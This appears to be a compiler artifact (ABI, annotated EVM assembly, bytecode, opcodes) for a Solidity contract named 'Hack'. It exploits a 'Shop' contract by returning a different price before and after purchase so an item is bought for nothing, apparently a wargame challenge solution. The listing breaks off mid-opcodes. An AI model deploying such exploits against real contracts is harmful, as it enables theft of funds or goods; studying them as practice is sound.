{
	"contracts/Shop.sol": {
		"Hack": {
			"abi": [
				{
					"inputs": [
						{
							"internalType": "address",
							"name": "_trgt",
							"type": "address"
						}
					],
					"stateMutability": "nonpayable",
					"type": "constructor"
				},
				{
					"inputs": [],
					"name": "price",
					"outputs": [
						{
							"internalType": "uint256",
							"name": "",
							"type": "uint256"
						}
					],
					"stateMutability": "view",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "pwn",
					"outputs": [],
					"stateMutability": "nonpayable",
					"type": "function"
				}
			],
			"devdoc": {
				"kind": "dev",
				"methods": {},
				"version": 1
			},
			"evm": {
				"assembly": "    /* \"contracts/Shop.sol\":408:793  contract Hack{... */\n  mstore(0x40, 0xa0)\n    /* \"contracts/Shop.sol\":460:522  constructor(address _trgt) {... */\n  callvalue\n  dup1\n  iszero\n  tag_1\n  jumpi\n  revert(0x00, 0x00)\ntag_1:\n  pop\n  mload(0x40)\n  sub(codesize, bytecodeSize)\n  dup1\n  bytecodeSize\n  dup4\n  codecopy\n  dup2\n  dup2\n  add\n  0x40\n  mstore\n  dup2\n  add\n  swap1\n  tag_2\n  swap2\n  swap1\n  tag_3\n  jump\t// in\ntag_2:\n    /* \"contracts/Shop.sol\":509:514  _trgt */\n  dup1\n    /* \"contracts/Shop.sol\":497:515  trgt = Shop(_trgt) */\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n  0x80\n  dup2\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n  dup2\n  mstore\n  pop\n  pop\n    /* \"contracts/Shop.sol\":460:522  constructor(address _trgt) {... */\n  pop\n    /* \"contracts/Shop.sol\":408:793  contract Hack{... */\n  jump(tag_6)\n    /* \"#utility.yul\":88:205   */\ntag_8:\n    /* \"#utility.yul\":197:198   */\n  0x00\n    /* \"#utility.yul\":194:195   */\n  0x00\n    /* \"#utility.yul\":187:199   */\n  revert\n    /* \"#utility.yul\":334:460   */\ntag_10:\n    /* \"#utility.yul\":371:378   */\n  0x00\n    /* \"#utility.yul\":411:453   */\n  0xffffffffffffffffffffffffffffffffffffffff\n    /* \"#utility.yul\":404:409   */\n  dup3\n    /* \"#utility.yul\":400:454   */\n  and\n    /* \"#utility.yul\":389:454   */\n  swap1\n  pop\n    /* \"#utility.yul\":334:460   */\n  swap2\n  swap1\n  pop\n  jump\t// out\n    /* \"#utility.yul\":466:562   */\ntag_11:\n    /* \"#utility.yul\":503:510   */\n  0x00\n    /* \"#utility.yul\":532:556   */\n  tag_20\n    /* \"#utility.yul\":550:555   */\n  dup3\n    /* \"#utility.yul\":532:556   */\n  tag_10\n  jump\t// in\ntag_20:\n    /* \"#utility.yul\":521:556   */\n  swap1\n  pop\n    /* \"#utility.yul\":466:562   */\n  swap2\n  swap1\n  pop\n  jump\t// out\n    /* \"#utility.yul\":568:690   */\ntag_12:\n    /* \"#utility.yul\":641:665   */\n  tag_22\n    /* \"#utility.yul\":659:664   */\n  dup2\n    /* \"#utility.yul\":641:665   */\n  tag_11\n  jump\t// in\ntag_22:\n    /* \"#utility.yul\":634:639   */\n  dup2\n    /* \"#utility.yul\":631:666   */\n  eq\n    /* \"#utility.yul\":621:684   */\n  tag_23\n  jumpi\n    /* \"#utility.yul\":680:681   */\n  0x00\n    /* \"#utility.yul\":677:678   */\n  0x00\n    /* \"#utility.yul\":670:682   */\n  revert\n    /* \"#utility.yul\":621:684   */\ntag_23:\n    /* \"#utility.yul\":568:690   */\n  pop\n  jump\t// out\n    /* \"#utility.yul\":696:839   */\ntag_13:\n    /* \"#utility.yul\":753:758   */\n  0x00\n    /* \"#utility.yul\":784:790   */\n  dup2\n    /* \"#utility.yul\":778:791   */\n  mload\n    /* \"#utility.yul\":769:791   */\n  swap1\n  pop\n    /* \"#utility.yul\":800:833   */\n  tag_25\n    /* \"#utility.yul\":827:832   */\n  dup2\n    /* \"#utility.yul\":800:833   */\n  tag_12\n  jump\t// in\ntag_25:\n    /* \"#utility.yul\":696:839   */\n  swap3\n  swap2\n  pop\n  pop\n  jump\t// out\n    /* \"#utility.yul\":845:1196   */\ntag_3:\n    /* \"#utility.yul\":915:921   */\n  0x00\n    /* \"#utility.yul\":964:966   */\n  0x20\n    /* \"#utility.yul\":952:961   */\n  dup3\n    /* \"#utility.yul\":943:950   */\n  dup5\n    /* \"#utility.yul\":939:962   */\n  sub\n    /* \"#utility.yul\":935:967   */\n  slt\n    /* \"#utility.yul\":932:1051   */\n  iszero\n  tag_27\n  jumpi\n    /* \"#utility.yul\":970:1049   */\n  tag_28\n  tag_8\n  jump\t// in\ntag_28:\n    /* \"#utility.yul\":932:1051   */\ntag_27:\n    /* \"#utility.yul\":1090:1091   */\n  0x00\n    /* \"#utility.yul\":1115:1179   */\n  tag_29\n    /* \"#utility.yul\":1171:1178   */\n  dup5\n    /* \"#utility.yul\":1162:1168   */\n  dup3\n    /* \"#utility.yul\":1151:1160   */\n  dup6\n    /* \"#utility.yul\":1147:1169   */\n  add\n    /* \"#utility.yul\":1115:1179   */\n  tag_13\n  jump\t// in\ntag_29:\n    /* \"#utility.yul\":1105:1179   */\n  swap2\n  pop\n    /* \"#utility.yul\":1061:1189   */\n  pop\n    /* \"#utility.yul\":845:1196   */\n  swap3\n  swap2\n  pop\n  pop\n  jump\t// out\n    /* \"contracts/Shop.sol\":408:793  contract Hack{... */\ntag_6:\n  mload(0x80)\n  codecopy(0x00, dataOffset(sub_0), dataSize(sub_0))\n  0x00\n  assignImmutable(\"0x6304e47846f882085b0f4b1a184252ae95ffe5e2a02daf39c014f492dcb1441c\")\n  return(0x00, dataSize(sub_0))\nstop\n\nsub_0: assembly {\n        /* \"contracts/Shop.sol\":408:793  contract Hack{... */\n      mstore(0x40, 0x80)\n      callvalue\n      dup1\n      iszero\n      tag_1\n      jumpi\n      revert(0x00, 0x00)\n    tag_1:\n      pop\n      jumpi(tag_2, lt(calldatasize, 0x04))\n      shr(0xe0, calldataload(0x00))\n      dup1\n      0xa035b1fe\n      eq\n      tag_3\n      jumpi\n      dup1\n      0xdd365b8b\n      eq\n      tag_4\n      jumpi\n    tag_2:\n      revert(0x00, 0x00)\n        /* \"contracts/Shop.sol\":630:791  function price() external view returns (uint){... */\n    tag_3:\n      tag_5\n      tag_6\n      jump\t// in\n    tag_5:\n      mload(0x40)\n      tag_7\n      swap2\n      swap1\n      tag_8\n      jump\t// in\n    tag_7:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"contracts/Shop.sol\":527:625  function pwn() external {... */\n    tag_4:\n      tag_9\n      tag_10\n      jump\t// in\n    tag_9:\n      stop\n        /* \"contracts/Shop.sol\":630:791  function price() external view returns (uint){... */\n    tag_6:\n        /* \"contracts/Shop.sol\":670:674  uint */\n      0x00\n        /* \"contracts/Shop.sol\":705:709  true */\n      0x01\n        /* \"contracts/Shop.sol\":688:709  trgt.isSold() == true */\n      iszero\n      iszero\n        /* \"contracts/Shop.sol\":688:692  trgt */\n      immutable(\"0x6304e47846f882085b0f4b1a184252ae95ffe5e2a02daf39c014f492dcb1441c\")\n        /* \"contracts/Shop.sol\":688:699  trgt.isSold */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xe852e741\n        /* \"contracts/Shop.sol\":688:701  trgt.isSold() */\n      mload(0x40)\n      dup2\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      0x20\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      dup7\n      gas\n      staticcall\n      iszero\n      dup1\n      iszero\n      tag_13\n      jumpi\n      returndatacopy(0x00, 0x00, returndatasize)\n      revert(0x00, returndatasize)\n    tag_13:\n      pop\n      pop\n      pop\n      pop\n      mload(0x40)\n      returndatasize\n      not(0x1f)\n      0x1f\n      dup3\n      add\n      and\n      dup3\n      add\n      dup1\n      0x40\n      mstore\n      pop\n      dup2\n      add\n      swap1\n      tag_14\n      swap2\n      swap1\n      tag_15\n      jump\t// in\n    tag_14:\n        /* \"contracts/Shop.sol\":688:709  trgt.isSold() == true */\n      iszero\n      iszero\n      sub\n        /* \"contracts/Shop.sol\":685:785  if(trgt.isSold() == true){... */\n      tag_16\n      jumpi\n        /* \"contracts/Shop.sol\":731:732  0 */\n      0x00\n        /* \"contracts/Shop.sol\":724:732  return 0 */\n      swap1\n      pop\n      jump(tag_11)\n        /* \"contracts/Shop.sol\":685:785  if(trgt.isSold() == true){... */\n    tag_16:\n        /* \"contracts/Shop.sol\":771:774  100 */\n      0x64\n        /* \"contracts/Shop.sol\":764:774  return 100 */\n      swap1\n      pop\n        /* \"contracts/Shop.sol\":630:791  function price() external view returns (uint){... */\n    tag_11:\n      swap1\n      jump\t// out\n        /* \"contracts/Shop.sol\":527:625  function pwn() external {... */\n    tag_10:\n        /* \"contracts/Shop.sol\":561:565  trgt */\n      immutable(\"0x6304e47846f882085b0f4b1a184252ae95ffe5e2a02daf39c014f492dcb1441c\")\n        /* \"contracts/Shop.sol\":561:569  trgt.buy */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xa6f2ae3a\n        /* \"contracts/Shop.sol\":561:571  trgt.buy() */\n      mload(0x40)\n      dup2\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup8\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_19\n      jumpi\n      revert(0x00, 0x00)\n    tag_19:\n      pop\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_21\n      jumpi\n      returndatacopy(0x00, 0x00, returndatasize)\n      revert(0x00, returndatasize)\n    tag_21:\n      pop\n      pop\n      pop\n      pop\n        /* \"contracts/Shop.sol\":605:606  0 */\n      0x00\n        /* \"contracts/Shop.sol\":589:593  trgt */\n      immutable(\"0x6304e47846f882085b0f4b1a184252ae95ffe5e2a02daf39c014f492dcb1441c\")\n        /* \"contracts/Shop.sol\":589:599  trgt.price */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xa035b1fe\n        /* \"contracts/Shop.sol\":589:601  trgt.price() */\n      mload(0x40)\n      dup2\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      0x20\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      dup7\n      gas\n      staticcall\n      iszero\n      dup1\n      iszero\n      tag_23\n      jumpi\n      returndatacopy(0x00, 0x00, returndatasize)\n      revert(0x00, returndatasize)\n    tag_23:\n      pop\n      pop\n      pop\n      pop\n      mload(0x40)\n      returndatasize\n      not(0x1f)\n      0x1f\n      dup3\n      add\n      and\n      dup3\n      add\n      dup1\n      0x40\n      mstore\n      pop\n      dup2\n      add\n      swap1\n      tag_24\n      swap2\n      swap1\n      tag_25\n      jump\t// in\n    tag_24:\n        /* \"contracts/Shop.sol\":589:606  trgt.price() == 0 */\n      eq\n        /* \"contracts/Shop.sol\":581:618  require(trgt.price() == 0, \"Failed!\") */\n      tag_26\n      jumpi\n      mload(0x40)\n      0x08c379a000000000000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n      0x04\n      add\n      tag_27\n      swap1\n      tag_28\n      jump\t// in\n    tag_27:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      revert\n    tag_26:\n        /* \"contracts/Shop.sol\":527:625  function pwn() external {... */\n      jump\t// out\n        /* \"#utility.yul\":7:84   */\n    tag_29:\n        /* \"#utility.yul\":44:51   */\n      0x00\n        /* \"#utility.yul\":73:78   */\n      dup2\n        /* \"#utility.yul\":62:78   */\n      swap1\n      pop\n        /* \"#utility.yul\":7:84   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":90:208   */\n    tag_30:\n        /* \"#utility.yul\":177:201   */\n      tag_45\n        /* \"#utility.yul\":195:200   */\n      dup2\n        /* \"#utility.yul\":177:201   */\n      tag_29\n      jump\t// in\n    tag_45:\n        /* \"#utility.yul\":172:175   */\n      dup3\n        /* \"#utility.yul\":165:202   */\n      mstore\n        /* \"#utility.yul\":90:208   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":214:436   */\n    tag_8:\n        /* \"#utility.yul\":307:311   */\n      0x00\n        /* \"#utility.yul\":345:347   */\n      0x20\n        /* \"#utility.yul\":334:343   */\n      dup3\n        /* \"#utility.yul\":330:348   */\n      add\n        /* \"#utility.yul\":322:348   */\n      swap1\n      pop\n        /* \"#utility.yul\":358:429   */\n      tag_47\n        /* \"#utility.yul\":426:427   */\n      0x00\n        /* \"#utility.yul\":415:424   */\n      dup4\n        /* \"#utility.yul\":411:428   */\n      add\n        /* \"#utility.yul\":402:408   */\n      dup5\n        /* \"#utility.yul\":358:429   */\n      tag_30\n      jump\t// in\n    tag_47:\n        /* \"#utility.yul\":214:436   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":523:640   */\n    tag_32:\n        /* \"#utility.yul\":632:633   */\n      0x00\n        /* \"#utility.yul\":629:630   */\n      0x00\n        /* \"#utility.yul\":622:634   */\n      revert\n        /* \"#utility.yul\":769:859   */\n    tag_34:\n        /* \"#utility.yul\":803:810   */\n      0x00\n        /* \"#utility.yul\":846:851   */\n      dup2\n        /* \"#utility.yul\":839:852   */\n      iszero\n        /* \"#utility.yul\":832:853   */\n      iszero\n        /* \"#utility.yul\":821:853   */\n      swap1\n      pop\n        /* \"#utility.yul\":769:859   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":865:981   */\n    tag_35:\n        /* \"#utility.yul\":935:956   */\n      tag_53\n        /* \"#utility.yul\":950:955   */\n      dup2\n        /* \"#utility.yul\":935:956   */\n      tag_34\n      jump\t// in\n    tag_53:\n        /* \"#utility.yul\":928:933   */\n      dup2\n        /* \"#utility.yul\":925:957   */\n      eq\n        /* \"#utility.yul\":915:975   */\n      tag_54\n      jumpi\n        /* \"#utility.yul\":971:972   */\n      0x00\n        /* \"#utility.yul\":968:969   */\n      0x00\n        /* \"#utility.yul\":961:973   */\n      revert\n        /* \"#utility.yul\":915:975   */\n    tag_54:\n        /* \"#utility.yul\":865:981   */\n      pop\n      jump\t// out\n        /* \"#utility.yul\":987:1124   */\n    tag_36:\n        /* \"#utility.yul\":1041:1046   */\n      0x00\n        /* \"#utility.yul\":1072:1078   */\n      dup2\n        /* \"#utility.yul\":1066:1079   */\n      mload\n        /* \"#utility.yul\":1057:1079   */\n      swap1\n      pop\n        /* \"#utility.yul\":1088:1118   */\n      tag_56\n        /* \"#utility.yul\":1112:1117   */\n      dup2\n        /* \"#utility.yul\":1088:1118   */\n      tag_35\n      jump\t// in\n    tag_56:\n        /* \"#utility.yul\":987:1124   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1130:1475   */\n    tag_15:\n        /* \"#utility.yul\":1197:1203   */\n      0x00\n        /* \"#utility.yul\":1246:1248   */\n      0x20\n        /* \"#utility.yul\":1234:1243   */\n      dup3\n        /* \"#utility.yul\":1225:1232   */\n      dup5\n        /* \"#utility.yul\":1221:1244   */\n      sub\n        /* \"#utility.yul\":1217:1249   */\n      slt\n        /* \"#utility.yul\":1214:1333   */\n      iszero\n      tag_58\n      jumpi\n        /* \"#utility.yul\":1252:1331   */\n      tag_59\n      tag_32\n      jump\t// in\n    tag_59:\n        /* \"#utility.yul\":1214:1333   */\n    tag_58:\n        /* \"#utility.yul\":1372:1373   */\n      0x00\n        /* \"#utility.yul\":1397:1458   */\n      tag_60\n        /* \"#utility.yul\":1450:1457   */\n      dup5\n        /* \"#utility.yul\":1441:1447   */\n      dup3\n        /* \"#utility.yul\":1430:1439   */\n      dup6\n        /* \"#utility.yul\":1426:1448   */\n      add\n        /* \"#utility.yul\":1397:1458   */\n      tag_36\n      jump\t// in\n    tag_60:\n        /* \"#utility.yul\":1387:1458   */\n      swap2\n      pop\n        /* \"#utility.yul\":1343:1468   */\n      pop\n        /* \"#utility.yul\":1130:1475   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1481:1603   */\n    tag_37:\n        /* \"#utility.yul\":1554:1578   */\n      tag_62\n        /* \"#utility.yul\":1572:1577   */\n      dup2\n        /* \"#utility.yul\":1554:1578   */\n      tag_29\n      jump\t// in\n    tag_62:\n        /* \"#utility.yul\":1547:1552   */\n      dup2\n        /* \"#utility.yul\":1544:1579   */\n      eq\n        /* \"#utility.yul\":1534:1597   */\n      tag_63\n      jumpi\n        /* \"#utility.yul\":1593:1594   */\n      0x00\n        /* \"#utility.yul\":1590:1591   */\n      0x00\n        /* \"#utility.yul\":1583:1595   */\n      revert\n        /* \"#utility.yul\":1534:1597   */\n    tag_63:\n        /* \"#utility.yul\":1481:1603   */\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1609:1752   */\n    tag_38:\n        /* \"#utility.yul\":1666:1671   */\n      0x00\n        /* \"#utility.yul\":1697:1703   */\n      dup2\n        /* \"#utility.yul\":1691:1704   */\n      mload\n        /* \"#utility.yul\":1682:1704   */\n      swap1\n      pop\n        /* \"#utility.yul\":1713:1746   */\n      tag_65\n        /* \"#utility.yul\":1740:1745   */\n      dup2\n        /* \"#utility.yul\":1713:1746   */\n      tag_37\n      jump\t// in\n    tag_65:\n        /* \"#utility.yul\":1609:1752   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1758:2109   */\n    tag_25:\n        /* \"#utility.yul\":1828:1834   */\n      0x00\n        /* \"#utility.yul\":1877:1879   */\n      0x20\n        /* \"#utility.yul\":1865:1874   */\n      dup3\n        /* \"#utility.yul\":1856:1863   */\n      dup5\n        /* \"#utility.yul\":1852:1875   */\n      sub\n        /* \"#utility.yul\":1848:1880   */\n      slt\n        /* \"#utility.yul\":1845:1964   */\n      iszero\n      tag_67\n      jumpi\n        /* \"#utility.yul\":1883:1962   */\n      tag_68\n      tag_32\n      jump\t// in\n    tag_68:\n        /* \"#utility.yul\":1845:1964   */\n    tag_67:\n        /* \"#utility.yul\":2003:2004   */\n      0x00\n        /* \"#utility.yul\":2028:2092   */\n      tag_69\n        /* \"#utility.yul\":2084:2091   */\n      dup5\n        /* \"#utility.yul\":2075:2081   */\n      dup3\n        /* \"#utility.yul\":2064:2073   */\n      dup6\n        /* \"#utility.yul\":2060:2082   */\n      add\n        /* \"#utility.yul\":2028:2092   */\n      tag_38\n      jump\t// in\n    tag_69:\n        /* \"#utility.yul\":2018:2092   */\n      swap2\n      pop\n        /* \"#utility.yul\":1974:2102   */\n      pop\n        /* \"#utility.yul\":1758:2109   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2115:2284   */\n    tag_39:\n        /* \"#utility.yul\":2199:2210   */\n      0x00\n        /* \"#utility.yul\":2233:2239   */\n      dup3\n        /* \"#utility.yul\":2228:2231   */\n      dup3\n        /* \"#utility.yul\":2221:2240   */\n      mstore\n        /* \"#utility.yul\":2273:2277   */\n      0x20\n        /* \"#utility.yul\":2268:2271   */\n      dup3\n        /* \"#utility.yul\":2264:2278   */\n      add\n        /* \"#utility.yul\":2249:2278   */\n      swap1\n      pop\n        /* \"#utility.yul\":2115:2284   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2290:2447   */\n    tag_40:\n        /* \"#utility.yul\":2430:2439   */\n      0x4661696c65642100000000000000000000000000000000000000000000000000\n        /* \"#utility.yul\":2426:2427   */\n      0x00\n        /* \"#utility.yul\":2418:2424   */\n      dup3\n        /* \"#utility.yul\":2414:2428   */\n      add\n        /* \"#utility.yul\":2407:2440   */\n      mstore\n        /* \"#utility.yul\":2290:2447   */\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2453:2818   */\n    tag_41:\n        /* \"#utility.yul\":2595:2598   */\n      0x00\n        /* \"#utility.yul\":2616:2682   */\n      tag_73\n        /* \"#utility.yul\":2680:2681   */\n      0x07\n        /* \"#utility.yul\":2675:2678   */\n      dup4\n        /* \"#utility.yul\":2616:2682   */\n      tag_39\n      jump\t// in\n    tag_73:\n        /* \"#utility.yul\":2609:2682   */\n      swap2\n      pop\n        /* \"#utility.yul\":2691:2784   */\n      tag_74\n        /* \"#utility.yul\":2780:2783   */\n      dup3\n        /* \"#utility.yul\":2691:2784   */\n      tag_40\n      jump\t// in\n    tag_74:\n        /* \"#utility.yul\":2809:2811   */\n      0x20\n        /* \"#utility.yul\":2804:2807   */\n      dup3\n        /* \"#utility.yul\":2800:2812   */\n      add\n        /* \"#utility.yul\":2793:2812   */\n      swap1\n      pop\n        /* \"#utility.yul\":2453:2818   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2824:3243   */\n    tag_28:\n        /* \"#utility.yul\":2990:2994   */\n      0x00\n        /* \"#utility.yul\":3028:3030   */\n      0x20\n        /* \"#utility.yul\":3017:3026   */\n      dup3\n        /* \"#utility.yul\":3013:3031   */\n      add\n        /* \"#utility.yul\":3005:3031   */\n      swap1\n      pop\n        /* \"#utility.yul\":3077:3086   */\n      dup2\n        /* \"#utility.yul\":3071:3075   */\n      dup2\n        /* \"#utility.yul\":3067:3087   */\n      sub\n        /* \"#utility.yul\":3063:3064   */\n      0x00\n        /* \"#utility.yul\":3052:3061   */\n      dup4\n        /* \"#utility.yul\":3048:3065   */\n      add\n        /* \"#utility.yul\":3041:3088   */\n      mstore\n        /* \"#utility.yul\":3105:3236   */\n      tag_76\n        /* \"#utility.yul\":3231:3235   */\n      dup2\n        /* \"#utility.yul\":3105:3236   */\n      tag_41\n      jump\t// in\n    tag_76:\n        /* \"#utility.yul\":3097:3236   */\n      swap1\n      pop\n        /* \"#utility.yul\":2824:3243   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n\n    auxdata: 0xa26469706673582212207f54128b234c39320d0a22b118492c4a0a07053ff5680c6540de05de6faa6af964736f6c634300081c0033\n}\n",
				"bytecode": {
					"linkReferences": {},
					"object": "60a060405234801561000f575f5ffd5b50604051610505380380610505833981810160405281019061003191906100c9565b8073ffffffffffffffffffffffffffffffffffffffff1660808173ffffffffffffffffffffffffffffffffffffffff1681525050506100f4565b5f5ffd5b5f73ffffffffffffffffffffffffffffffffffffffff82169050919050565b5f6100988261006f565b9050919050565b6100a88161008e565b81146100b2575f5ffd5b50565b5f815190506100c38161009f565b92915050565b5f602082840312156100de576100dd61006b565b5b5f6100eb848285016100b5565b91505092915050565b6080516103ec6101195f395f818160670152818161010b015261018701526103ec5ff3fe608060405234801561000f575f5ffd5b5060043610610034575f3560e01c8063a035b1fe14610038578063dd365b8b14610056575b5f5ffd5b610040610060565b60405161004d919061026c565b60405180910390f35b61005e610109565b005b5f600115157f000000000000000000000000000000000000000000000000000000000000000073ffffffffffffffffffffffffffffffffffffffff1663e852e7416040518163ffffffff1660e01b8152600401602060405180830381865afa1580156100ce573d5f5f3e3d5ffd5b505050506040513d601f19601f820116820180604052508101906100f291906102be565b151503610101575f9050610106565b606490505b90565b7f000000000000000000000000000000000000000000000000000000000000000073ffffffffffffffffffffffffffffffffffffffff1663a6f2ae3a6040518163ffffffff1660e01b81526004015f604051808303815f87803b15801561016e575f5ffd5b505af1158015610180573d5f5f3e3d5ffd5b505050505f7f000000000000000000000000000000000000000000000000000000000000000073ffffffffffffffffffffffffffffffffffffffff1663a035b1fe6040518163ffffffff1660e01b8152600401602060405180830381865afa1580156101ee573d5f5f3e3d5ffd5b505050506040513d601f19601f820116820180604052508101906102129190610313565b14610252576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161024990610398565b60405180910390fd5b565b5f819050919050565b61026681610254565b82525050565b5f60208201905061027f5f83018461025d565b92915050565b5f5ffd5b5f8115159050919050565b61029d81610289565b81146102a7575f5ffd5b50565b5f815190506102b881610294565b92915050565b5f602082840312156102d3576102d2610285565b5b5f6102e0848285016102aa565b91505092915050565b6102f281610254565b81146102fc575f5ffd5b50565b5f8151905061030d816102e9565b92915050565b5f6020828403121561032857610327610285565b5b5f610335848285016102ff565b91505092915050565b5f82825260208201905092915050565b7f4661696c656421000000000000000000000000000000000000000000000000005f82015250565b5f61038260078361033e565b915061038d8261034e565b602082019050919050565b5f6020820190508181035f8301526103af81610376565b905091905056fea26469706673582212207f54128b234c39320d0a22b118492c4a0a07053ff5680c6540de05de6faa6af964736f6c634300081c0033",
					"opcodes": "PUSH1 0xA0 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0xF JUMPI PUSH0 PUSH0 REVERT JUMPDEST POP PUSH1 0x40 MLOAD PUSH2 0x505 CODESIZE SUB DUP1 PUSH2 0x505 DUP4 CODECOPY DUP2 DUP2 ADD PUSH1 0x40 MSTORE DUP2 ADD SWAP1 PUSH2 0x31 SWAP2 SWAP1 PUSH2 0xC9 JUMP JUMPDEST DUP1 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH1 0x80 DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE POP POP POP PUSH2 0xF4 JUMP JUMPDEST PUSH0 PUSH0 REVERT JUMPDEST PUSH0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0x98 DUP3 PUSH2 0x6F JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0xA8 DUP2 PUSH2 0x8E JUMP JUMPDEST DUP2 EQ PUSH2 0xB2 JUMPI PUSH0 PUSH0 REVERT JUMPDEST POP JUMP JUMPDEST PUSH0 DUP2 MLOAD SWAP1 POP PUSH2 0xC3 DUP2 PUSH2 0x9F JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0xDE JUMPI PUSH2 0xDD PUSH2 0x6B JUMP JUMPDEST JUMPDEST PUSH0 PUSH2 0xEB DUP5 DUP3 DUP6 ADD PUSH2 0xB5 JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x80 MLOAD PUSH2 0x3EC PUSH2 0x119 PUSH0 CODECOPY PUSH0 DUP2 DUP2 PUSH1 0x67 ADD MSTORE DUP2 DUP2 PUSH2 0x10B ADD MSTORE PUSH2 0x187 ADD MSTORE PUSH2 0x3EC PUSH0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0xF JUMPI PUSH0 PUSH0 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH2 0x34 JUMPI PUSH0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0xA035B1FE EQ PUSH2 0x38 JUMPI DUP1 PUSH4 0xDD365B8B EQ PUSH2 0x56 JUMPI JUMPDEST PUSH0 PUSH0 REVERT JUMPDEST PUSH2 0x40 PUSH2 0x60 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x4D SWAP2 SWAP1 PUSH2 0x26C JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x5E PUSH2 0x109 JUMP JUMPDEST STOP JUMPDEST PUSH0 PUSH1 0x1 ISZERO ISZERO PUSH32 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0xE852E741 PUSH1 0x40 MLOAD DUP2 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP7 GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0xCE JUMPI RETURNDATASIZE PUSH0 PUSH0 RETURNDATACOPY RETURNDATASIZE PUSH0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0xF2 SWAP2 SWAP1 PUSH2 0x2BE JUMP JUMPDEST ISZERO ISZERO SUB PUSH2 0x101 JUMPI PUSH0 SWAP1 POP PUSH2 0x106 JUMP JUMPDEST PUSH1 0x64 SWAP1 POP JUMPDEST SWAP1 JUMP JUMPDEST PUSH32 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0xA6F2AE3A PUSH1 0x40 MLOAD DUP2 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x16E JUMPI PUSH0 PUSH0 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x180 JUMPI RETURNDATASIZE PUSH0 PUSH0 RETURNDATACOPY RETURNDATASIZE PUSH0 REVERT JUMPDEST POP POP POP POP PUSH0 PUSH32 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0xA035B1FE PUSH1 0x40 MLOAD DUP2 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 